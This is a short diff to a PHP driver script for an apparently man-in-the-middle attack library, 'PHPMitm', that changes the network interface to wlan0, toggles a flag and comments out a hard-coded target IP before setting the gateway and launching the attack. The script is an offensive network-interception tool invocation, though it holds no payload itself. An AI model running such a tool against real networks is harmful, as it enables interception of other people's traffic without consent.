@@ -25,18 +25,17 @@
 require_once './PHPMitm.php';
 
 
+$attack = new PHPMitm('wlan0', true);
 
-$attack = new PHPMitm('eth1', false);
 try {
     $attack->set_DefaultGateway();
-    $attack->set_TargetMachine('10.128.129.147');
+    #$attack->set_TargetMachine('10.128.129.147');
     $attack->sanity_checks();
     $attack->initial_attack_prep();
     $attack->attack();
 } catch(PHPMitm_Exception $e) {
     die ($e->getMessage());
 }
-
 
 
 
